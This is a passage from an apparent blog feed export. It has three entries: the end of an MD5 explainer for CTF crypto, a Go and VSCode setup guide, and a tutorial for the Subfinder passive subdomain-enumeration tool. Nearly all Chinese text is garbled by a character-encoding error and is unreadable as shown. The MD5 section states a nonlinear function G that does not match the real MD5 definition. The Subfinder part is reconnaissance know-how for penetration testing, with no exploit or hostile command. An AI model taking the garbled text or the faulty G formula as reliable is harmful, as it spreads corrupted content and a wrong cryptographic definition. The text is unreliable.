¸å¿ƒè¿ç®—ï¼Œå…¶ä¸­ C ä¸ºéçº¿æ€§å‡½æ•° F,G,H,I ä¸­çš„ä¸€ä¸ªï¼Œğ‘‘ &lt;&lt; ğ‘  è¡¨ç¤ºå¯¹æ•° d å¾ªç¯å·¦ç§» s ä½ï¼Œ+ è¡¨ç¤ºæ¨¡ 2^32 åŠ æ³•ï¼Œåé¢ä¸ºäº†æ–¹ä¾¿æˆ‘ä»¬ç›´æ¥å†™ +ï¼Œæ ¸å¿ƒè¿ç®— CC æˆ‘ä»¬å®š ä¹‰ä¸ºï¼š </p><p>ğ¶ğ¶(ğ‘Š, ğ‘‹, ğ‘Œ, ğ‘, ğ‘€, ğ‘ , ğ‘¡) : ğ‘Š = ğ‘‹ + ( (ğ‘Š + ğ¶(ğ‘‹, ğ‘Œ, ğ‘) + ğ‘€ + ğ‘¡) &lt;&lt; ğ‘ ) (7.1) </p><p>å¦‚æœ C ç”¨ F æ›¿æ¢ï¼Œé‚£ä¹ˆæ ¸å¿ƒè¿ç®— CC å°±æ˜¯ FFï¼›å¦‚æœ C ç”¨ G æ›¿æ¢ï¼Œé‚£ä¹ˆæ ¸å¿ƒè¿ç®— CC å°±æ˜¯ GGï¼›å¦‚æœ C ç”¨ H æ›¿æ¢ï¼Œé‚£ä¹ˆæ ¸å¿ƒè¿ç®— CC å°±æ˜¯ HHï¼›å¦‚æœ C ç”¨ I æ›¿æ¢ï¼Œé‚£ä¹ˆæ ¸å¿ƒè¿ ç®— CC å°±æ˜¯ IIã€‚ </p><p>è¿™é‡Œæˆ‘ä»¬å…¶å®æ˜¯å®šä¹‰äº† R è¿ç®—ä¸­çš„å‡½æ•° FFã€GGã€HHã€IIã€‚ </p><h5 id="éçº¿æ€§å‡½æ•°"><a href="#éçº¿æ€§å‡½æ•°" class="headerlink" title="éçº¿æ€§å‡½æ•°"></a>éçº¿æ€§å‡½æ•°</h5><p>åœ¨æ ¸å¿ƒè¿ç®—å®šä¹‰ä¸­æœ‰å››ä¸ªéçº¿æ€§å‡½æ•° ğ¹(ğ‘‹, ğ‘Œ, ğ‘), ğº(ğ‘‹, ğ‘Œ, ğ‘), ğ»(ğ‘‹, ğ‘Œ, ğ‘), ğ¼(ğ‘‹, ğ‘Œ, ğ‘)ï¼Œ ä¸‹é¢æˆ‘ä»¬åˆ†åˆ«å®šä¹‰è¿™å››ä¸ªéçº¿æ€§å‡½æ•°ã€‚ </p><p>æˆ‘ä»¬å®šä¹‰å››ä¸ªéçº¿æ€§å‡½æ•°ï¼Œå…¶ä¸­ Xï¼ŒYï¼ŒZ æ˜¯ 32bit æ•°,âˆ§ æ˜¯ä¸æ“ä½œï¼Œâˆ¨ æ˜¯æˆ–æ“ä½œ,âŠ• æ˜¯ å¼‚æˆ–æ“ä½œï¼ŒÂ¬ æ˜¯éæ“ä½œã€‚ </p><ol><li>ğ¹(ğ‘‹, ğ‘Œ, ğ‘) = (ğ‘‹ âˆ§ ğ‘Œ) âˆ¨ (Â¬ğ‘‹ âˆ§ ğ‘) </li><li>ğº(ğ‘‹, ğ‘Œ, ğ‘) = (ğ‘‹ âˆ§ ğ‘) âˆ¨ (Â¬ğ‘Œ âˆ§ Â¬ğ‘) </li><li>ğ»(ğ‘‹, ğ‘Œ, ğ‘) = ğ‘‹ âŠ• ğ‘Œ âŠ• ğ‘ </li><li>ğ¼(ğ‘‹, ğ‘Œ, ğ‘) = ğ‘Œ âŠ• (ğ‘‹ âˆ§ Â¬ğ‘) </li></ol>]]></content>
    
    
    <categories>
      
      <category>Crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Go-VScode</title>
    <link href="/2021/10/11/Code/Go/Go-VScode/"/>
    <url>/2021/10/11/Code/Go/Go-VScode/</url>
    
    <content type="html"><![CDATA[<h1 id="Go-VScode"><a href="#Go-VScode" class="headerlink" title="Go-VScode"></a>Go-VScode</h1><h2 id="Goç¯å¢ƒ"><a href="#Goç¯å¢ƒ" class="headerlink" title="Goç¯å¢ƒ"></a>Goç¯å¢ƒ</h2><h3 id="ä¸‹è½½å®‰è£…"><a href="#ä¸‹è½½å®‰è£…" class="headerlink" title="ä¸‹è½½å®‰è£…"></a>ä¸‹è½½å®‰è£…</h3><p>Goå®˜ç½‘ä¸‹è½½åœ°å€ï¼š<a href="https://golang.org/dl/">https://golang.org/dl/</a></p><p>Goå®˜æ–¹é•œåƒç½‘ç«™ï¼ˆæ¨èï¼‰ï¼š<a href="https://golang.google.cn/dl/">https://golang.google.cn/dl/</a></p><p>ä¸‹è½½å®‰è£…å®Œæˆåï¼Œ<code>cmd</code> éªŒè¯æ˜¯å¦å®‰è£…æˆåŠŸï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">&gt; go version<br>go version go1.<span class="hljs-number">17.2</span> windows/amd64<br></code></pre></td></tr></table></figure><h3 id="é…ç½®-GOPATH"><a href="#é…ç½®-GOPATH" class="headerlink" title="é…ç½® GOPATH"></a>é…ç½® GOPATH</h3><p>è¿™æ­¥ä¸æ˜¯å¿…é¡»çš„ï¼Œå¯ä»¥æ ¹æ®è‡ªå·±çš„æƒ…å†µæ¥å†³å®šæ˜¯å¦è·³è¿‡ã€‚</p><p>Go å¼€å‘åŒ…åœ¨å®‰è£…å®Œæˆåä¼šä¸º <code>GOPATH</code> ï¼ˆå·¥ç¨‹ç›®å½•ï¼‰è®¾ç½®ä¸€ä¸ªé»˜è®¤ç›®å½•ï¼ˆWindowsä¸‹ä¸ºï¼š <code>%USERPROFILE%\go</code> ï¼‰ï¼Œè¿™é‡Œæˆ‘æ”¹æˆå…¶ä»–ç›®å½•ã€‚</p><p>ä¿®æ”¹ç”¨æˆ·å˜é‡ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">å˜é‡å:</span> <span class="hljs-string">GOPATH</span><br><span class="hljs-string">å˜é‡å€¼:</span> <span class="hljs-string">D:\Go</span><br></code></pre></td></tr></table></figure><p>åœ¨ <code>D:\Go</code> ä¸‹æ–°å»º <code>binã€pkgã€src</code> ä¸‰ä¸ªæ–‡ä»¶å¤¹ã€‚</p><p>åŒæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å°† <code>GOPATH</code> ä¸‹çš„ <code>bin</code> ç›®å½•æ·»åŠ åˆ°ç³»ç»Ÿå˜é‡ <code>Path</code> ä¸­ï¼Œä»¥ä¾¿åé¢æ›´æ–¹ä¾¿çš„ä½¿ç”¨ã€‚</p><h3 id="é…ç½®-Goproxy-ç¯å¢ƒå˜é‡"><a href="#é…ç½®-Goproxy-ç¯å¢ƒå˜é‡" class="headerlink" title="é…ç½® Goproxy ç¯å¢ƒå˜é‡"></a>é…ç½® Goproxy ç¯å¢ƒå˜é‡</h3><blockquote><p>è¿™æ­¥ä¸»è¦æ˜¯å› ä¸º Goçš„ä¸€äº›ä¾èµ–åŒ…æŒ‚åœ¨Googleå’ŒGitHubä¸Šï¼Œå›½å†…è®¿é—®ä¼šæœ‰äº›é—®é¢˜ï¼ŒVSCodeå®‰è£…æ’ä»¶åéœ€è¦å®‰è£…ä¸€äº›å·¥å…·ï¼Œè¿™æ—¶å¦‚æœä¸è¿›è¡Œé…ç½®çš„è¯ï¼Œå°±ä¼šä¸‹è½½å¤±è´¥ã€‚</p></blockquote><p>Goproxyå®˜ç½‘ï¼š <a href="https://goproxy.io/">GOPROXY.IO - A Global Proxy for Go Modules</a></p><p>è¿™é‡Œä»‹ç»Windowsä¸‹ä½¿é…ç½®é•¿ä¹…ç”Ÿæ•ˆçš„åšæ³•ï¼ˆè¿™æ ·å°±ä¸ç”¨æ¯æ¬¡éƒ½å»é…ç½®ç¯å¢ƒå˜é‡äº†ï¼‰ï¼Œå…¶ä»–çš„å¯ä»¥å»å®˜ç½‘æŸ¥çœ‹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">1. å³é”® æˆ‘çš„ç”µè„‘ -&gt; å±æ€§ -&gt; é«˜çº§ç³»ç»Ÿè®¾ç½® -&gt; ç¯å¢ƒå˜é‡<br>2. åœ¨ â€œ[ä½ çš„ç”¨æˆ·å]çš„ç”¨æˆ·å˜é‡â€ ä¸­ç‚¹å‡» â€æ–°å»ºâ€œ æŒ‰é’®<br>3. åœ¨ â€œå˜é‡åâ€ è¾“å…¥æ¡†ä¸­æ–°å¢ â€œGOPROXYâ€<br>4. åœ¨å¯¹åº”çš„ â€œå˜é‡å€¼â€ è¾“å…¥æ¡†ä¸­æ–°å¢ â€œhttps://goproxy.io,directâ€<br>5. æœ€åç‚¹å‡» â€œç¡®å®šâ€ æŒ‰é’®ä¿å­˜è®¾ç½®<br></code></pre></td></tr></table></figure><p>é…ç½®å®Œæˆåï¼Œ<code>cmd</code> éªŒè¯æ˜¯å¦é…ç½®æˆåŠŸï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs powershell">&gt; go env<br><span class="hljs-built_in">set</span> GO111MODULE=<br><span class="hljs-built_in">set</span> GOARCH=amd64<br><span class="hljs-built_in">set</span> GOBIN=<br><span class="hljs-built_in">set</span> GOCACHE=C:\Users\<span class="hljs-number">13562</span>\AppData\Local\go<span class="hljs-literal">-build</span><br><span class="hljs-built_in">set</span> GOENV=C:\Users\<span class="hljs-number">13562</span>\AppData\Roaming\go\env<br><span class="hljs-built_in">set</span> GOEXE=.exe<br><span class="hljs-built_in">set</span> GOEXPERIMENT=<br><span class="hljs-built_in">set</span> GOFLAGS=<br><span class="hljs-built_in">set</span> GOHOSTARCH=amd64<br><span class="hljs-built_in">set</span> GOHOSTOS=windows<br><span class="hljs-built_in">set</span> GOINSECURE=<br><span class="hljs-built_in">set</span> GOMODCACHE=D:\Go\pkg\mod<br><span class="hljs-built_in">set</span> GONOPROXY=<br><span class="hljs-built_in">set</span> GONOSUMDB=<br><span class="hljs-built_in">set</span> GOOS=windows<br><span class="hljs-built_in">set</span> GOPATH=D:\Go<br><span class="hljs-built_in">set</span> GOPRIVATE=<br><span class="hljs-built_in">set</span> GOPROXY=https://goproxy.io,direct<br><span class="hljs-built_in">set</span> GOROOT=C:\Program Files\Go<br><span class="hljs-built_in">set</span> GOSUMDB=sum.golang.org<br><span class="hljs-built_in">set</span> GOTMPDIR=<br><span class="hljs-built_in">set</span> GOTOOLDIR=C:\Program Files\Go\pkg\tool\windows_amd64<br><span class="hljs-built_in">set</span> GOVCS=<br><span class="hljs-built_in">set</span> GOVERSION=go1.<span class="hljs-number">17.2</span><br><span class="hljs-built_in">set</span> GCCGO=gccgo<br><span class="hljs-built_in">set</span> AR=ar<br><span class="hljs-built_in">set</span> CC=gcc<br><span class="hljs-built_in">set</span> CXX=g++<br><span class="hljs-built_in">set</span> CGO_ENABLED=<span class="hljs-number">1</span><br><span class="hljs-built_in">set</span> GOMOD=NUL<br><span class="hljs-built_in">set</span> CGO_CFLAGS=<span class="hljs-literal">-g</span> <span class="hljs-literal">-O2</span><br><span class="hljs-built_in">set</span> CGO_CPPFLAGS=<br><span class="hljs-built_in">set</span> CGO_CXXFLAGS=<span class="hljs-literal">-g</span> <span class="hljs-literal">-O2</span><br><span class="hljs-built_in">set</span> CGO_FFLAGS=<span class="hljs-literal">-g</span> <span class="hljs-literal">-O2</span><br><span class="hljs-built_in">set</span> CGO_LDFLAGS=<span class="hljs-literal">-g</span> <span class="hljs-literal">-O2</span><br><span class="hljs-built_in">set</span> PKG_CONFIG=pkg<span class="hljs-literal">-config</span><br><span class="hljs-built_in">set</span> GOGCCFLAGS=<span class="hljs-literal">-m64</span> <span class="hljs-literal">-mthreads</span> <span class="hljs-literal">-fmessage</span><span class="hljs-literal">-length</span>=<span class="hljs-number">0</span> <span class="hljs-literal">-fdebug</span><span class="hljs-literal">-prefix</span><span class="hljs-literal">-map</span>=C:\Users\<span class="hljs-number">13562</span>\AppData\Local\Temp\go<span class="hljs-literal">-build3293688615</span>=/tmp/go<span class="hljs-literal">-build</span> <span class="hljs-literal">-gno</span><span class="hljs-literal">-record</span><span class="hljs-literal">-gcc</span><span class="hljs-literal">-switches</span><br><br></code></pre></td></tr></table></figure><p>è¿™é‡Œï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„æ‰€æœ‰é…ç½®ï¼ŒåŒ…æ‹¬ <code>GOPATH</code> å’Œ <code>GOROOT</code> ã€‚</p><h2 id="VSCode"><a href="#VSCode" class="headerlink" title="VSCode"></a>VSCode</h2><h3 id="å®‰è£…æ’ä»¶å’Œå·¥å…·"><a href="#å®‰è£…æ’ä»¶å’Œå·¥å…·" class="headerlink" title="å®‰è£…æ’ä»¶å’Œå·¥å…·"></a>å®‰è£…æ’ä»¶å’Œå·¥å…·</h3><p>1ã€å®‰è£… Goæ’ä»¶</p><p>2ã€å®‰è£…æˆåŠŸåï¼Œåœ¨æˆ‘ä»¬åˆ›å»ºçš„ <code>src</code> ä¸­åˆ›å»ºä¸€ä¸ªé¡¹ç›®æ–‡ä»¶ <code>Hello</code>ï¼Œé€šè¿‡ <code>VSCode</code> æ‰“å¼€ï¼Œæ–°å»º <code>Helloworld.go</code> æ–‡ä»¶ï¼Œè¿™æ—¶ä¼šæç¤ºæˆ‘ä»¬ç¼ºå°‘å·¥å…·ï¼Œæˆ‘ä»¬ç‚¹ <code>install all</code> å°±è¡Œï¼Œç­‰å¾…å®‰è£…å®Œæˆ ã€‚</p><h3 id="ç¼–å†™è¿è¡ŒHello-World"><a href="#ç¼–å†™è¿è¡ŒHello-World" class="headerlink" title="ç¼–å†™è¿è¡ŒHello World"></a>ç¼–å†™è¿è¡ŒHello World</h3><p>ç¼–å†™ <code>Helloworld.go</code> ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <span class="hljs-comment">// å£°æ˜ main åŒ…ï¼Œè¡¨æ˜å½“å‰æ˜¯ä¸€ä¸ªå¯æ‰§è¡Œç¨‹åº</span><br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <span class="hljs-comment">// å¯¼å…¥å†…ç½® fmt åŒ…</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-comment">// mainå‡½æ•°ï¼Œæ˜¯ç¨‹åºæ‰§è¡Œçš„å…¥å£</span><br>    fmt.Println(<span class="hljs-string">&quot;Hello World!&quot;</span>)  <span class="hljs-comment">// åœ¨ç»ˆç«¯æ‰“å° Hello World!</span><br>&#125;<br></code></pre></td></tr></table></figure><p>è¿è¡Œ <code>Helloworld.go</code> ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> D:\Go\src\Hello&gt; go run .\Helloworld.go<br>Hello World!<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>VScode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Go</tag>
      
      <tag>VScode</tag>
      
      <tag>env</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Subfinder</title>
    <link href="/2021/10/11/HW/Tools/Subfinder/"/>
    <url>/2021/10/11/HW/Tools/Subfinder/</url>
    
    <content type="html"><![CDATA[<h1 id="Subfinder"><a href="#Subfinder" class="headerlink" title="Subfinder"></a>Subfinder</h1><p>subfinder æ˜¯ç”± GO è¯­è¨€å¼€å‘çš„ä¸€æ¬¾å­åŸŸåæ”¶é›†å·¥å…·ï¼Œé™¤äº† DNS æšä¸¾ä¹‹å¤–ï¼Œé›†æˆäº†å¤šä¸ªåœ¨çº¿ç½‘ç«™çš„åŸŸåæŸ¥è¯¢åŠŸèƒ½ï¼ŒåŒ…æ‹¬ï¼šBinaryedgeï¼ŒCertspotterï¼ŒCensysï¼ŒChaosï¼ŒDnsDBï¼ŒGithubï¼ŒIntelxï¼ŒPassivetotalï¼ŒRecon.devï¼ŒRobtexï¼ŒSecurityTrailsï¼ŒShodanï¼ŒSpyseï¼ŒThreatbookï¼ŒVirustotalï¼ŒZoomeye</p><p>GitHubé¡¹ç›®åœ°å€ï¼š<a href="https://github.com/projectdiscovery/subfinder">https://github.com/projectdiscovery/subfinder</a></p><p>ä¸€ä¸ªæ±‡é›†äº† 7 ç§ API çš„å­åŸŸå‘ç°å·¥å…·ï¼Œå¯é€šè¿‡ä½¿ç”¨è¢«åŠ¨çš„åœ¨çº¿èµ„æºæ¥å‘ç°ç½‘ç«™çš„æœ‰æ•ˆå­åŸŸã€‚å®ƒå…·æœ‰ç®€å•çš„æ¨¡å—åŒ–æ¶æ„ï¼Œå¹¶é’ˆå¯¹é€Ÿåº¦è¿›è¡Œäº†ä¼˜åŒ–ã€‚subfinder ä»…ç”¨äºåšä¸€ä»¶äº‹ï¼Œé‚£å°±æ˜¯è¢«åŠ¨å­åŸŸæšä¸¾ã€‚</p><h2 id="Subfinder-1"><a href="#Subfinder-1" class="headerlink" title="Subfinder"></a>Subfinder</h2><p>ä¸€ä¸ªå­åŸŸå‘ç°å·¥å…·ï¼Œå¯é€šè¿‡ä½¿ç”¨è¢«åŠ¨çš„åœ¨çº¿èµ„æºæ¥å‘ç°ç½‘ç«™çš„æœ‰æ•ˆå­åŸŸã€‚å®ƒå…·æœ‰ç®€å•çš„æ¨¡å—åŒ–æ¶æ„ï¼Œå¹¶é’ˆå¯¹é€Ÿåº¦è¿›è¡Œäº†ä¼˜åŒ–ã€‚subfinder ä»…ç”¨äºåšä¸€ä»¶äº‹ï¼Œé‚£å°±æ˜¯è¢«åŠ¨å­åŸŸæšä¸¾ã€‚</p><p>åœ¨è·å¾—äº† APIKEY åï¼Œå¯è¿›è¡Œå…¨æ–¹é¢çš„è¢«åŠ¨å¼å­åŸŸå‘ç°ï¼Œä¸ºæ¸—é€æµ‹è¯•äººå‘˜æä¾›æœåŠ¡ã€‚</p><h2 id="ç‰¹å¾âœ¨"><a href="#ç‰¹å¾âœ¨" class="headerlink" title="ç‰¹å¾âœ¨"></a>ç‰¹å¾âœ¨</h2><ul><li>æ¨¡å—åŒ–æ¶æ„</li><li>é€Ÿåº¦å¿«ã€è½»é‡çº§èµ„æº</li><li>ä¸°å¯Œçš„è¢«åŠ¨æºï¼ˆæˆªè‡³ç›®å‰å·²æœ‰26ä¸ªæºï¼‰</li><li>æ”¯æŒé›†æˆ Stdinå’Œ stdout</li><li>å¤šç§è¾“å‡ºæ ¼å¼</li></ul><h2 id="å®‰è£…â—"><a href="#å®‰è£…â—" class="headerlink" title="å®‰è£…â—"></a>å®‰è£…â—</h2><p>é¡¹ç›®åœ°å€ï¼š<a href="https://link.zhihu.com/?target=https%3A//github.com/projectdiscovery/subfinder">https://github.com/projectdiscovery/subfinder</a></p><p>ä½¿ç”¨ç‰ˆæœ¬ï¼šv2.2.4</p><p>ç¯å¢ƒï¼šwin10</p><blockquote><p>ç›´æ¥å®‰è£…éœ€ go1.13+ æ‰èƒ½æˆåŠŸå®‰è£…ï¼</p></blockquote><p><strong>Docker ä¸€é”®éƒ¨ç½²</strong></p><p>å…ˆæ‹‰å–å®˜æ–¹é•œåƒã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">docker pull ice3man/subfinder<br></code></pre></td></tr></table></figure><p>è¿è¡Œï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">docker run -it ice3man/subfinder<br></code></pre></td></tr></table></figure><p>æç¤ºæ²¡æœ‰æä¾›è¾“å…¥åˆ—è¡¨ï¼Œè¿è¡Œå‘½ä»¤åé¢æ¥å‚æ•°æŒ‡ä»¤å³å¯ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">docker run -it ice3man/subfinder -h<br></code></pre></td></tr></table></figure><p>æ˜¾ç¤ºå¸®åŠ©èœå•ã€‚</p><ul><li>-config APIå¯†é’¥ç­‰çš„é…ç½®æ–‡ä»¶</li><li>-d æŸ¥æ‰¾å­åŸŸ</li><li>-dL åŒ…å«è¦æšä¸¾çš„åŸŸåˆ—è¡¨çš„æ–‡ä»¶</li><li>-exclude-sources æ¸…å•ä¸­è¦æ’é™¤çš„æ¥æºæ¸…å•</li><li>-max-time ç­‰å¾…æšä¸¾ç»“æœçš„åˆ†é’Ÿæ•°ï¼ˆé»˜è®¤ä¸º10ï¼‰</li><li>-nC ä¸è¦åœ¨è¾“å‡ºä¸­ä½¿ç”¨é¢œè‰²</li><li>-nW ä»è¾“å‡ºä¸­åˆ é™¤é€šé…ç¬¦å’Œå¤±æ•ˆå­åŸŸ</li><li>-o è¾“å‡ºåˆ°æŒ‡å®šæ–‡ä»¶ï¼ˆå¯é€‰ï¼‰</li><li>-oD å°†æšä¸¾ç»“æœå†™å…¥æŒ‡å®šç›®å½•ï¼ˆå¯é€‰ï¼‰</li><li>-oI ä»¥Hostï¼ŒIPæ ¼å¼å†™å…¥è¾“å‡º</li><li>-oJ ä»¥JSONè¡Œæ ¼å¼å†™å…¥è¾“å‡º</li><li>-r ä»¥é€—å·åˆ†éš”çš„è¦ä½¿ç”¨çš„è§£æç¨‹åºåˆ—è¡¨</li><li>-rL åŒ…å«è¦ä½¿ç”¨çš„è§£æå™¨åˆ—è¡¨çš„æ–‡æœ¬æ–‡ä»¶</li><li>-silent ä»…æ˜¾ç¤ºè¾“å‡ºä¸­çš„å­åŸŸ</li><li>-sources ç”¨é€—å·åˆ†éš”çš„æ¥æºåˆ—è¡¨</li><li>-t ç”¨äºè§£æçš„å¹¶å‘ goroutine çš„æ•°é‡ï¼ˆé»˜è®¤ä¸º10ï¼‰</li><li>-timeout è¶…æ—¶æ—¶é—´ï¼ˆé»˜è®¤ä¸º30ï¼‰</li><li>-v æ˜¾ç¤ºè¯¦ç»†è¾“å‡º</li></ul><p>Windows ä¸‹è¿˜å¯ä»¥è‡ªå·±ä¸‹è½½ exe æ–‡ä»¶è¿è¡Œã€‚</p><p>ä¸‹è½½åœ°å€ï¼š<a href="https://link.zhihu.com/?target=https%3A//github.com/projectdiscovery/subfinder/releases">https://github.com/projectdiscovery/subfinder/releases</a></p><p>è¿è¡Œæ–¹å¼ï¼šcmd è·³è½¬åˆ°å…¶ç›¸åŒç›®å½•ï¼Œç„¶åï¼šï¼ˆä¾‹å¦‚å‘½ä»¤ -hï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">subfinder-windows-amd64.exe -h<br></code></pre></td></tr></table></figure><h2 id="ä½¿ç”¨-API"><a href="#ä½¿ç”¨-API" class="headerlink" title="ä½¿ç”¨ API"></a>ä½¿ç”¨ API</h2><ul><li><a href="https://link.zhihu.com/?target=https%3A//www.virustotal.com/">Virustotal</a></li><li><a href="https://link.zhihu.com/?target=http%3A//passivetotal.org/">Passivetotal</a></li><li><a href="https://link.zhihu.com/?target=http%3A//securitytrails.com/">SecurityTrails</a></li><li><a href="https://link.zhihu.com/?target=https%3A//censys.io/">Censys</a></li><li><a href="https://link.zhihu.com/?target=https%3A//binaryedge.io/">Binaryedge</a></li><li><a href="https://link.zhihu.com/?target=https%3A//shodan.io/">Shodan</a></li><li><a href="https://link.zhihu.com/?target=https%3A//urlscan.io/">URLScan</a></li></ul><p>éœ€è¦æ³¨å†Œå…¶å¸å·ï¼Œè·å– APIKEYï¼Œç„¶åè°ƒç”¨å³å¯ã€‚è¯´å¾—æœ‰ç‚¹å•°å—¦ï¼Œç›´æ¥çœ‹ä¸‹é¢çš„æ“ä½œå§ã€‚</p><p>ä¾‹å¦‚ï¼Œå…ˆè·å– shodan çš„ APIKEYï¼š</p><p>è¿›å…¥ shodan å®˜ç½‘ï¼š<a href="https://link.zhihu.com/?target=https%3A//www.shodan.io/">https://www.shodan.io/</a> å¹¶ç™»å½•ã€‚è¿›å…¥â€œæˆ‘çš„è´¦æˆ·â€ï¼š</p><p><img src="https://pic4.zhimg.com/80/v2-37763752a113d14d1aaee8e6e80872f3_1440w.jpg" alt="img"></p><p>è·å– APIKEYï¼š</p><p><img src="https://pic2.zhimg.com/80/v2-c9be9d1fc0baf5209ac9deb691900071_1440w.jpg" alt="img"></p><p>ç„¶åï¼Œåˆ›å»ºæ–‡ä»¶ï¼š<strong>config.yaml</strong></p><p><strong>demoï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs text">resolvers:<br>  - 1.1.1.1<br>  - 1.0.0.1<br>  - 8.8.8.8<br>  - 8.8.4.4<br>  - 9.9.9.9<br>  - 9.9.9.10<br>  - 77.88.8.8<br>  - 77.88.8.1<br>  - 208.67.222.222<br>  - 208.67.220.220<br>sources:<br>  - archiveis<br>  - binaryedge<br>  - bufferover<br>  - censys<br>  - certspotter<br>  - certspotterold<br>  - commoncrawl<br>  - crtsh<br>  - digicert<br>  - dnsdumpster<br>  - entrust<br>  - googleter<br>  - hackertarget<br>  - ipv4info<br>  - passivetotal<br>  - securitytrails<br>  - shodan<br>  - sitedossier<br>  - threatcrowd<br>  - threatminer<br>  - urlscan<br>  - virustotal<br>  - waybackarchive<br>binaryedge: []<br>censys: []<br>certspotter: []<br>passivetotal: []<br>securitytrails: []<br>shodan: []<br>urlscan: []<br>virustotal: []<br></code></pre></td></tr></table></figure><p>å°† APIKEY å¡«å…¥ã€ã€‘ä¸­å¹¶ä¿å­˜ï¼Œè¿è¡Œï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">subfinder-windows-amd64.exe -config config.yaml -d example.com<br></code></pre></td></tr></table></figure><h2 id="ä¸€ã€å®‰è£…"><a href="#ä¸€ã€å®‰è£…" class="headerlink" title="ä¸€ã€å®‰è£…"></a>ä¸€ã€å®‰è£…</h2><p>å®‰è£…æ–¹å¼(go ç‰ˆæœ¬è¦æ±‚ä¸º 1.14+)ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">go get <span class="hljs-literal">-v</span> github.com/projectdiscovery/subfinder/v2/cmd/subfinder<br></code></pre></td></tr></table></figure><p>å®‰è£…å®Œæˆä¹‹åï¼Œé¦–å…ˆæŸ¥çœ‹å¸®åŠ©ä¿¡æ¯ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">subfinder <span class="hljs-literal">-h</span><br></code></pre></td></tr></table></figure><h2 id="äºŒã€é…ç½®"><a href="#äºŒã€é…ç½®" class="headerlink" title="äºŒã€é…ç½®"></a>äºŒã€é…ç½®</h2><h2 id="ä¸‰ã€ä½¿ç”¨"><a href="#ä¸‰ã€ä½¿ç”¨" class="headerlink" 